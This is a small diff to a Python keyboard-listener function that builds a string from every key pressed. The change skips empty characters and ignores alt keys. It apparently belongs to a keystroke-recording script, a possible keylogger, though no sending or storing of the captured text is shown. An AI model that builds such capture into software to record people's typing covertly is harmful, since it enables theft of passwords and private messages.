@@ -9,7 +9,8 @@ def keyPressed(key):
     global message
     try:
         char = key.char
-        message = message + str(char)
+        if char != None:
+            message = message + str(char)
     except:
         print(str(key))
         if key == keyboard.Key.tab:
@@ -17,6 +18,8 @@ def keyPressed(key):
         elif key == keyboard.Key.space:
             message += " "
         elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
+            pass
+        elif key == keyboard.Key.alt_gr or key == keyboard.Key.alt_r or key == keyboard.Key.alt_l:
             pass
         elif key == keyboard.Key.backspace:
             if len(message) > 0:
